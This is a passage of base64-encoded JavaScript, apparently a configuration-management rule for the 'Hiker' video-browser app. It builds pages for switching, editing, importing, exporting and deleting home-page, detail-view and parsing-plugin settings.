3Q6Ly/or6Xlj6Pku6TkuI3mmK/lvbHniYfor6bmg4XpobXpnaLphY3nva5cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXFxcbiAgICAgICAgICAgIGxldCBpbXBvcnRDb25maWdzID0gQ29uZmlnVG9vbC5pbXBvcnQoaW5wdXQpO1xcXFxuICAgICAgICAgICAgaWYgKCFpbXBvcnRDb25maWdzKSByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+S8vOS5juWHuuS6humUme+8jOivt+WwneivleWGjeasoeWvvOWFpe+9nlxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9uYW1lXFxcXFxcXCIsIGltcG9ydENvbmZpZ3MubmFtZSk7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X2NvZGVcXFxcXFxcIiwgaW1wb3J0Q29uZmlncy5kYXRhLmNvbmZpZyk7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X3NldHRpbmdfY29kZVxcXFxcXFwiLCBpbXBvcnRDb25maWdzLmRhdGEuc2V0dGluZyB8fCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3J1bGU96Z2S6LGGJnZpZXc9ZGV0YWlsVmlld01vZGVFZGl0UGFnZSc7XFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ/Cfk6QnLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGRldGFpbHNWaWV3Q29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnKSwgMikuc2VsZWN0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIC8vIGlmIChpbnB1dCA9PT0gJ+m7mOiupCcpIHJldHVybiAndG9hc3Q6Ly/pu5jorqTphY3nva7ml6Dms5XnvJbovpHvvIEnXFxcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3V0aWxzJykpLnJ1bGUpXFxcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gZ2V0Q29uZmlnKCk7XFxcXG4gICAgICAgICAgICBsZXQgc2VsZWN0Q29uZmlnID0ge1xcXFxuICAgICAgICAgICAgICAgIG5hbWU6IGlucHV0LFxcXFxuICAgICAgICAgICAgICAgIGRhdGE6IGNvbmZpZy5kZXRhaWxzVmlld0NvbmZpZ3NbaW5wdXRdXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gJChDb25maWdUb29sLmVuY1R5cGVMaXN0LCAyKS5zZWxlY3QoKHNlbGVjdENvbmZpZykgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gQ29uZmlnVG9vbC50b0NsaXBib2FyZChDb25maWdUb29sLmV4cG9ydChzZWxlY3RDb25maWcubmFtZSwgc2VsZWN0Q29uZmlnLCBcXFxcXFxcIuW9seeJh+ivpuaDhemhtemdoumFjee9rlxcXFxcXFwiLCBpbnB1dCkpXFxcXG4gICAgICAgICAgICB9LCBzZWxlY3RDb25maWcpXFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbn1cXFxcbi8vIOivpuaDhemhteiuvue9ruaooeWdl1xcXFxuZnVuY3Rpb24gZGV0YWlsVmlld1NldHRpbmdNb2R1bGUoZCkge1xcXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcXFxuICAgIGRldGFpbFZpZXdNb2RlTW9kdWxlKGQsIGRldGFpbHNWaWV3Q29uZmlncylcXFxcbiAgICBsZXQgZGV0YWlsVmlld1NldHRpbmcgPSBkZXRhaWxzVmlld0NvbmZpZ3NbZGV0YWlsc1ZpZXdDb25maWdzLnVzZV0uc2V0dGluZ1xcXFxuICAgIGxldCByZXN1bHQgPSBcXFxcXFxcInRvYXN0Oi8v6K+l6K+m5oOF6aG15peg6K6+572u6aG16Z2iXFxcXFxcXCI7XFxcXG4gICAgaWYgKGRldGFpbFZpZXdTZXR0aW5nKSB7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBpZiAoZGV0YWlsVmlld1NldHRpbmcuaW5kZXhPZigncmV0dXJuJykgPT0gLTEpIHRocm93IG5ldyBFcnJvcign5b+F6aG7IHJldHVybiBAcnVsZT1qczog5oiWICQoKS5ydWxlJyk7XFxcXG4gICAgICAgICAgICBpZiAoZGV0YWlsVmlld1NldHRpbmcuc3RhcnRzV2l0aChcXFxcXFxcIihcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgICAgICBldmFsKCdyZXN1bHQgPSAnICsgZGV0YWlsVmlld1NldHRpbmcpXFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIGV2YWwoJ3Jlc3VsdCA9ICcgKyAnKCgpID0+IHsnICsgZGV0YWlsVmlld1NldHRpbmcgKyAnfSkoKScpXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpO1xcXFxuICAgICAgICAgICAgcmVzdWx0ID0gXFxcXFxcXCJ0b2FzdDovL+mUmeivr+eahOiuvue9rumhtemdouS7o+eggSzor7fliY3lvoAg5pel5b+XIOafpeeci+mUmeivr+WOn+WboFxcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfimpnvuI8nLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiByZXN1bHRcXFxcbiAgICB9KVxcXFxufVxcXFxuXFxcXG4vLyDpppbpobXorr7nva7mqKHlnZdcXFxcbmZ1bmN0aW9uIGhvbWVQYWdlU2V0dGluZ01vZHVsZShkKSB7XFxcXG4gICAgbGV0IGhvbWVQYWdlQ29uZmlncyA9IGdldENvbmZpZygnaG9tZVBhZ2VDb25maWdzJyk7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfoh6rlrprkuYnpppbpobUnLmJvbGQoKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcbiAgICB9KVxcXFxuICAgIGZvciAobGV0IGNvbmZpZ0tleSBvZiBPYmplY3Qua2V5cyhob21lUGFnZUNvbmZpZ3MpKSB7XFxcXG4gICAgICAgIGlmIChjb25maWdLZXkgPT09ICd1c2UnKSBjb250aW51ZTtcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBjb25maWdLZXkgPT09IGhvbWVQYWdlQ29uZmlncy51c2UgPyBcXFxcXFxcIuKAnOKAnFxcXFxcXFwiICsgY29uZmlnS2V5ICsgXFxcXFxcXCLigJ3igJ1cXFxcXFxcIiA6IGNvbmZpZ0tleSxcXFxcbiAgICAgICAgICAgIHVybDogJChcXFxcXFxcImhpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZShjb25maWdLZXkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHJlcXVlc3QoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpXFxcXG4gICAgICAgICAgICAgICAgaWYgKGNvbmZpZy5ob21lUGFnZUNvbmZpZ3MudXNlID09PSBjb25maWdLZXkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgLy9wdXRNeVZhcihcXFxcXFxcImlucHV0X2NvbmZpZ190eXBlXFxcXFxcXCIsICfpppbpobXphY3nva4nKVxcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X25hbWVcXFxcXFxcIiwgY29uZmlnS2V5KTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9jb2RlXFxcXFxcXCIsIGNvbmZpZy5ob21lUGFnZUNvbmZpZ3NbY29uZmlnS2V5XS5jb25maWcpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWhvbWVQYWdlTW9kZUVkaXRQYWdlJztcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgY29uZmlnLmhvbWVQYWdlQ29uZmlncy51c2UgPSBjb25maWdLZXlcXFxcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSlcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+WIh+aNouaIkOWKnydcXFxcbiAgICAgICAgICAgIH0sIGNvbmZpZ0tleSksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJ1xcXFxuICAgICAgICB9KVxcXFxuICAgIH1cXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogJ2JsYW5rX2Jsb2NrJ1xcXFxuICAgIH0pXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfinpUnLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3ZpZXc9aG9tZVBhZ2VNb2RlRWRpdFBhZ2UnXFxcXG4gICAgfSk7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfinpYnLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGhvbWVQYWdlQ29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnICYmIGNvbmZpZ0tleSAhPT0gJ+m7mOiupCcpLCAyKVxcXFxuICAgICAgICAgICAgLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0ID09PSAn6buY6K6kJykgcmV0dXJuICd0b2FzdDovL+m7mOiupOmFjee9ruaXoOazleWIoOmZpO+8gSdcXFxcbiAgICAgICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PT0gY29uZmlnLmhvbWVQYWdlQ29uZmlncy51c2UpIHJldHVybiAndG9hc3Q6Ly/or6XphY3nva7mraPlnKjkvb/nlKjvvIzml6Dms5XliKDpmaTvvIEnXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICQoJ+ehruiupOWIoOmZpFxcXFxcXFwiJyArIGlucHV0ICsgJ1xcXFxcXFwi77yfJykuY29uZmlybSgoY29uZmlnLCBjb25maWdLZXkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlIGNvbmZpZy5ob21lUGFnZUNvbmZpZ3NbY29uZmlnS2V5XVxcXFxuICAgICAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSlcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5Yig6ZmkJyArIGNvbmZpZ0tleSArICfmiJDlip8nXFxcXG4gICAgICAgICAgICAgICAgfSwgY29uZmlnLCBpbnB1dClcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ/Cfk50nLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGhvbWVQYWdlQ29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnKSwgMikuc2VsZWN0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIC8vIGlmIChpbnB1dCA9PT0gJ+m7mOiupCcpIHJldHVybiAndG9hc3Q6Ly/pu5jorqTphY3nva7ml6Dms5XnvJbovpHvvIEnXFxcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKTtcXFxcbiAgICAgICAgICAgIGxldCBjb25maWdLZXkgPSBpbnB1dDtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiaW5wdXRfbmFtZVxcXFxcXFwiLCBjb25maWdLZXkpO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9jb2RlXFxcXFxcXCIsIGNvbmZpZy5ob21lUGFnZUNvbmZpZ3NbY29uZmlnS2V5XS5jb25maWcpO1xcXFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2Uvc2V0dGluZy1lZGl0b3I/cnVsZT3pnZLosYYmdmlldz1ob21lUGFnZU1vZGVFZGl0UGFnZSc7XFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ/Cfk6UnLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiXFxcXFxcXCIsIFxcXFxcXFwi6K+36L6T5YWl5Y+j5LukXFxcXFxcXCIpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIGlmICghaW5wdXQuaW5jbHVkZXMoXFxcXFxcXCLpppbpobXphY3nva5cXFxcXFxcIikpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6K+l5Y+j5Luk5LiN5piv6aaW6aG16YWN572uXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3V0aWxzJykpLnJ1bGUpXFxcXG4gICAgICAgICAgICBsZXQgaW1wb3J0Q29uZmlncyA9IENvbmZpZ1Rvb2wuaW1wb3J0KGlucHV0KTtcXFxcbiAgICAgICAgICAgIGlmICghaW1wb3J0Q29uZmlncykgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kvLzkuY7lh7rkuobplJnvvIzor7flsJ3or5Xlho3mrKHlr7zlhaXvvZ5cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiaW5wdXRfbmFtZVxcXFxcXFwiLCBpbXBvcnRDb25maWdzLm5hbWUpO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9jb2RlXFxcXFxcXCIsIGltcG9ydENvbmZpZ3MuZGF0YS5jb25maWcpO1xcXFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2Uvc2V0dGluZy1lZGl0b3I/cnVsZT3pnZLosYYmdmlldz1ob21lUGFnZU1vZGVFZGl0UGFnZSc7XFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ/Cfk6QnLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGhvbWVQYWdlQ29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnKSwgMikuc2VsZWN0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIC8vIGlmIChpbnB1dCA9PT0gJ+m7mOiupCcpIHJldHVybiAndG9hc3Q6Ly/pu5jorqTphY3nva7ml6Dms5XnvJbovpHvvIEnXFxcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3V0aWxzJykpLnJ1bGUpXFxcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gZ2V0Q29uZmlnKCk7XFxcXG4gICAgICAgICAgICBsZXQgc2VsZWN0Q29uZmlnID0ge1xcXFxuICAgICAgICAgICAgICAgIG5hbWU6IGlucHV0LFxcXFxuICAgICAgICAgICAgICAgIGRhdGE6IGNvbmZpZy5ob21lUGFnZUNvbmZpZ3NbaW5wdXRdXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gJChDb25maWdUb29sLmVuY1R5cGVMaXN0LCAyKS5zZWxlY3QoKHNlbGVjdENvbmZpZykgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gQ29uZmlnVG9vbC50b0NsaXBib2FyZChDb25maWdUb29sLmV4cG9ydChzZWxlY3RDb25maWcubmFtZSwgc2VsZWN0Q29uZmlnLCBcXFxcXFxcIummlumhtemFjee9rlxcXFxcXFwiLCBpbnB1dCkpXFxcXG4gICAgICAgICAgICB9LCBzZWxlY3RDb25maWcpXFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbn1cXFxcblxcXFxuLy8g6Kej5p6Q6YWN572u5qih5Z2XXFxcXG5mdW5jdGlvbiBhbmFseXNpc01vZGVNb2R1bGUoZCwgYW5hbHlzaXNDb25maWdzKSB7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfoh6rlrprkuYnop6PmnpDmj5Lku7YnLmJvbGQoKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcbiAgICB9KVxcXFxuICAgIGZvciAobGV0IGNvbmZpZ0tleSBvZiBPYmplY3Qua2V5cyhhbmFseXNpc0NvbmZpZ3MpKSB7XFxcXG4gICAgICAgIGlmIChjb25maWdLZXkgPT09ICd1c2UnKSBjb250aW51ZTtcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBjb25maWdLZXkgPT09IGFuYWx5c2lzQ29uZmlncy51c2UgPyBcXFxcXFxcIuKAnOKAnFxcXFxcXFwiICsgY29uZmlnS2V5ICsgXFxcXFxcXCLigJ3igJ1cXFxcXFxcIiA6IGNvbmZpZ0tleSxcXFxcbiAgICAgICAgICAgIHVybDogJChcXFxcXFxcImhpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZShjb25maWdLZXkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHJlcXVlc3QoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpXFxcXG4gICAgICAgICAgICAgICAgaWYgKGNvbmZpZy5hbmFseXNpc0NvbmZpZ3MudXNlID09PSBjb25maWdLZXkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgLy9wdXRNeVZhcihcXFxcXFxcImlucHV0X2NvbmZpZ190eXBlXFxcXFxcXCIsICfop6PmnpDmj5Lku7bphY3nva4nKVxcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X25hbWVcXFxcXFxcIiwgY29uZmlnS2V5KTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9jb2RlXFxcXFxcXCIsIGNvbmZpZy5hbmFseXNpc0NvbmZpZ3NbY29uZmlnS2V5XS5jb25maWcpO1xcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X2V4dHJhXFxcXFxcXCIsIGNvbmZpZy5hbmFseXNpc0NvbmZpZ3NbY29uZmlnS2V5XS5leHRyYSB8fCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9zZXR0aW5nX2NvZGVcXFxcXFxcIiwgY29uZmlnLmFuYWx5c2lzQ29uZmlnc1tjb25maWdLZXldLnNldHRpbmcgfHwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3J1bGU96Z2S6LGGJnZpZXc9YW5hbHlzaXNNb2RlRWRpdFBhZ2UnO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBjb25maWcuYW5hbHlzaXNDb25maWdzLnVzZSA9IGNvbmZpZ0tleVxcXFxuICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKVxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5YiH5o2i5oiQ5YqfJ1xcXFxuICAgICAgICAgICAgfSwgY29uZmlnS2V5KSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nXFxcXG4gICAgICAgIH0pXFxcXG4gICAgfVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxcXG4gICAgfSlcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ+KelScsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcXFxuICAgICAgICB1cmw6ICdoaWtlcjovL3BhZ2Uvc2V0dGluZy1lZGl0b3I/cnVsZT3pnZLosYYmdmlldz1hbmFseXNpc01vZGVFZGl0UGFnZSdcXFxcbiAgICB9KTtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ+KelicsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcXFxuICAgICAgICB1cmw6ICQoT2JqZWN0LmtleXMoYW5hbHlzaXNDb25maWdzKS5maWx0ZXIoY29uZmlnS2V5ID0+IGNvbmZpZ0tleSAhPT0gJ3VzZScgJiYgY29uZmlnS2V5ICE9PSAn5LiN6Kej5p6QJyAmJiBjb25maWdLZXkgIT09ICfmlq3mj5InKSwgMilcXFxcbiAgICAgICAgICAgIC5zZWxlY3QoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PT0gJ+S4jeino+aekCcgJiYgaW5wdXQgPT09ICfmlq3mj5InKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6Kej5p6Q5peg5rOV5Yig6Zmk77yBJ1xcXFxuICAgICAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHJlcXVlc3QoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpXFxcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0ID09PSBjb25maWcuYW5hbHlzaXNDb25maWdzLnVzZSkgcmV0dXJuICd0b2FzdDovL+ivpeino+aekOato+WcqOS9v+eUqO+8jOaXoOazleWIoOmZpO+8gSdcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJCgn56Gu6K6k5Yig6ZmkXFxcXFxcXCInICsgaW5wdXQgKyAnXFxcXFxcXCLvvJ8nKS5jb25maXJtKChjb25maWcsIGNvbmZpZ0tleSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICBkZWxldGUgY29uZmlnLmFuYWx5c2lzQ29uZmlnc1tjb25maWdLZXldXFxcXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKVxcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/liKDpmaQnICsgY29uZmlnS2V5ICsgJ+aIkOWKnydcXFxcbiAgICAgICAgICAgICAgICB9LCBjb25maWcsIGlucHV0KVxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICB9KVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAn8J+TnScsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcXFxuICAgICAgICB1cmw6ICQoT2JqZWN0LmtleXMoYW5hbHlzaXNDb25maWdzKS5maWx0ZXIoY29uZmlnS2V5ID0+IGNvbmZpZ0tleSAhPT0gJ3VzZScpLCAyKVxcXFxuICAgICAgICAgICAgLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgLy8gaWYgKGlucHV0ID09PSAn5LiN6Kej5p6QJyAmJiBpbnB1dCA9PT0gJ+aWreaPkicpIHJldHVybiAndG9hc3Q6Ly/pu5jorqTop6PmnpDml6Dms5XnvJbovpHvvIEnXFxcXG4gICAgICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGNvbmZpZ0tleSA9IGlucHV0O1xcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiaW5wdXRfbmFtZVxcXFxcXFwiLCBjb25maWdLZXkpO1xcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiaW5wdXRfY29kZVxcXFxcXFwiLCBjb25maWcuYW5hbHlzaXNDb25maWdzW2NvbmZpZ0tleV0uY29uZmlnKTtcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X2V4dHJhXFxcXFxcXCIsIGNvbmZpZy5hbmFseXNpc0NvbmZpZ3NbY29uZmlnS2V5XS5leHRyYSB8fCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X3NldHRpbmdfY29kZVxcXFxcXFwiLCBjb25maWcuYW5hbHlzaXNDb25maWdzW2NvbmZpZ0tleV0uc2V0dGluZyB8fCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWFuYWx5c2lzTW9kZUVkaXRQYWdlJztcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ/Cfk6UnLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiXFxcXFxcXCIsIFxcXFxcXFwi6K+36L6T5YWl5Y+j5LukXFxcXFxcXCIpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIGlmICghaW5wdXQuaW5jbHVkZXMoXFxcXFxcXCLop6PmnpDmj5Lku7bphY3nva5cXFxcXFxcIikpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6K+l5Y+j5Luk5LiN5piv6Kej5p6Q5o+S5Lu26YWN572uXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3V0aWxzJykpLnJ1bGUpXFxcXG4gICAgICAgICAgICBsZXQgaW1wb3J0Q29uZmlncyA9IENvbmZpZ1Rvb2wuaW1wb3J0KGlucHV0KTtcXFxcbiAgICAgICAgICAgIGlmICghaW1wb3J0Q29uZmlncykgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kvLzkuY7lh7rkuobplJnvvIzor7flsJ3or5Xlho3mrKHlr7zlhaXvvZ5cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiaW5wdXRfbmFtZVxcXFxcXFwiLCBpbXBvcnRDb25maWdzLm5hbWUpO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpb